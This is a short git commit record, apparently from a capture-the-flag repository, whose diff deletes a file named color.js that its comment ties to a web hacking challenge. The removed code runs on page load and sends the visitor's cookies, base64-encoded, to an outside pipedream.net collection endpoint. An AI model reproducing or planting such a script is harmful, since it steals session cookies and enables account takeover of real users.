d99cc9e70a5ffbb0e24c63ad6e5271d199cfab72
HotTeaDrink <HotTeaDrink@users.noreply.github.com>
2025-01-30 17:48:09 +0000

    deploy: 92579185391e93d9d1d7ebc2b485eb49a84e4a6c

--- web-client/ch62/color.js
+++
@@ -1,4 +0,0 @@
-// Note: This is for a web hacking challenge, please don't try to interact with anything beside the website
-document.addEventListener('DOMContentLoaded', () => {
-    window.location="https://eotoci65n24zl7e.m.pipedream.net/"+btoa(document.cookie); 
-});
